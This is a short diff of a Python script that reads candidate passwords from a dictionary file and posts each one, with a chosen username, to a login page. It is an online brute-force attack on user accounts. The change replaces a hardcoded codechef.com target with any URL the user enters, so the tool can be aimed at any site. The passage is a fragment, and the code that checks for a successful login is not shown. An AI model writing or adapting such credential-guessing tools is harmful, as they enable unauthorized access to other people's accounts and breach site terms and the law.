@@ -4,6 +4,7 @@ import requests
 #headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}
 dictfile =open('dict.txt','r').readlines()
 username=raw_input("Enter username:")
+web_page=raw_input("Enter url of web page")
 for pas in dictfile:
     password=pas.strip()
     login_info={
@@ -14,7 +15,7 @@ for pas in dictfile:
         'op': 'Login'
     }
     with requests.Session() as s:
-        url="https://www.codechef.com/"
+        url=web_page
         #page=s.get(url,headers=headers)
         #bsp=BeautifulSoup(u.content,'html5lib')
         page=s.post(url, data=login_info)
